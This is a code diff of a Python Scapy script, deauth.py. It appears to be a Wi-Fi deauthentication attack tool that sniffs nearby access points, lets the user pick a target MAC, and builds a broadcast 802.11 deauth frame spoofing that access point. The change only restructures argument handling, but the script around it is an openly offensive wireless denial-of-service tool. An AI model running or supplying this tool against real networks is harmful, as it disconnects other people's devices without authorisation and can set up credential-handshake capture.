@@ -38,31 +38,32 @@ def stopFilter(x): #Stop the Sniffing if packet reachs the count
     else:
         return False
 
-if os.environ["DEAUTH"]:
+try:
     input=os.environ["DEAUTH"]
     startAirmon()
-    
-elif len(sys.argv)==1:
-    startAirmon()
-    print "Sniffing wifi signals. Please wait....\n"
-    sniff(iface="mon0", prn = packetHandler, stop_filter=stopFilter)
-    print "Please choose SSID to send deauthentication packets"
-    ap=dict()
-    while True:
-        for mac, ssid in ap_list.iteritems():
-            print str(ssid[0]).ljust(2," "),mac.ljust(20," "),ssid[1]
-            ap.setdefault(ssid[0],mac)
-        x=int(raw_input(">>"))
-        input=ap[x]
-        if x in ap:
-            break
-elif len(sys.argv)==2:
-    input=sys.argv[1]
-    startAirmon()
+except:
+    if len(sys.argv)==1:
+        startAirmon()
+        print "Sniffing wifi signals. Please wait....\n"
+        sniff(iface="mon0", prn = packetHandler, stop_filter=stopFilter)
+        print "Please choose SSID to send deauthentication packets"
+        ap=dict()
+        while True:
+            for mac, ssid in ap_list.iteritems():
+                print str(ssid[0]).ljust(2," "),mac.ljust(20," "),ssid[1]
+                ap.setdefault(ssid[0],mac)
+            x=int(raw_input(">>"))
+            input=ap[x]
+            if x in ap:
+                break
 
-elif len(sys.argv)>2:
-    print "Usage: sudo python deauth.py [MAC]"
-    sys.exit()
+    elif len(sys.argv)==2:
+        input=sys.argv[1]
+        startAirmon()
+
+    elif len(sys.argv)>2:
+        print "Usage: sudo python deauth.py [MAC]"
+        sys.exit()
 
 pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=input,addr3=input)/Dot11Deauth()
 
